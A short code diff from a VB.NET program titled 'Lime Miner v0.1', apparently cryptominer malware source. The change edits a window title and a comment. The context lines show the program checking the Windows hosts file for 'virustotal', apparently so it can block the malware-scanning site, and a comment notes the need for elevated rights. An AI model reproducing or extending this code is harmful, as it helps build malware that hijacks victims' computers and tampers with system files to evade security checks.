@@ -43,7 +43,7 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-            HuraForm1.Text = HuraForm1.Text + " @" + Environment.UserName
+           HuraForm1.Text = "Lime Miner v0.1 @" + Environment.UserName
         Catch ex As Exception
         End Try
 
@@ -54,7 +54,7 @@ Public Class Form1
         Catch ex As Exception
         End Try
 
-        'In case user is an idiot
+        'In case user is an idiot (need run as, use manifest)
         Try
             Dim path As String = "C:\Windows\System32\Drivers\Etc\Hosts"
             If IO.File.Exists(path) AndAlso Not IO.File.ReadAllText(path).Contains("virustotal") Then
